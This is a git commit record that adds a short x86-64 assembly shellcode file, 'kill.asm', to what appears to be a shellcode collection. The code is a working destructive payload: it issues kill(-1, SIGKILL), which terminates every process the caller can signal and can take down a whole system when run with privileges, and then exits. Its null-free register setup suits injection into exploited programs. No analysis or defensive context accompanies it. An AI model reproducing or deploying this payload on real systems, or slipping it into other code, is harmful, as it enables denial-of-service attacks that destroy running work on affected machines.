712cd462694da7b920956e10d92649eed7c259e3
Bastian Pukallus <bplinux@posteo.de>
2021-05-08 14:03:06 +0200

    added kill shellcode, removed wrong license

---
+++ shellcodes/x64/kill/kill.asm
@@ -0,0 +1,22 @@
+[BITS 64]
+
+KILL	equ 62
+PID	equ -1
+SIGKILL	equ 9
+EXIT	equ 60
+
+segment .text
+	global _start
+
+_start:	xor rax, rax
+	mov al, KILL
+	xor rdi, rdi
+	mov edi, PID
+	xor rsi, rsi
+	mov sil, SIGKILL
+	syscall
+	xor rax, rax
+	mov al, EXIT
+	xor rdi, rdi
+	syscall
+
